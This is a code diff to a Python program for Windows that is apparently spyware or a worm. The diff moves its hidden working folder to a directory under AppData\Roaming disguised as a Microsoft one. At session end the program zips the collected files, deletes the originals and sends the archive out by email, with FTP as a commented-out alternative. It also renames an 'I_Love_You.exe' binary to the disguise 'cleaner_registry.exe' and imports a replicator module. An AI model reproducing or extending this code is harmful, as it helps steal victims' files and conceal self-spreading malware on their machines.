@@ -8,6 +8,10 @@ import win32con
 import win32api
 import win32gui
 
+
+Directory = 'C:\\Users\\' + \
+    os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'
+
 # Reads the messages from the message map and prints
 
 
@@ -15,9 +19,9 @@ def wndproc(hwnd, msg, wparam, lparam):
     ctrl = msg
     # Sends email on End of Session
     if ctrl == 17:
-        shutil.make_archive('C:\\SYSTEM.SWAV\\Am0ASk2',
-                            'zip', 'C:\\SYSTEM.SWAV\\', 'Am0ASk2')
-        shutil.rmtree('C:\\SYSTEM.SWAV\\Am0ASk2')
+        shutil.make_archive(Directory + 'Am0ASk2',
+                            'zip', Directory, 'Am0ASk2')
+        shutil.rmtree(os.path.join(Directory,'Am0ASk2'))
         import sender
         sender.Email()          # Invite files via email
         # sender.FTP()          # Invite files via FTP
@@ -28,10 +32,10 @@ def wndproc(hwnd, msg, wparam, lparam):
 def keeper():
     import replicator
     # renames I_Love_You.exe to a more convincing name
-    fake_name = 'C:\\SYSTEM.SWAV\\cleaner_registry.exe'
-    dir = 'C:\\SYSTEM.SWAV\\I_Love_You.exe'
+    fakeName = Directory + 'cleaner_registry.exe'
+    dir = Directory + 'I_Love_You.exe'
     try:
-        os.renames(dir, fake_name)
+        os.renames(dir, fakeName)
     except FileNotFoundError:
         pass
 
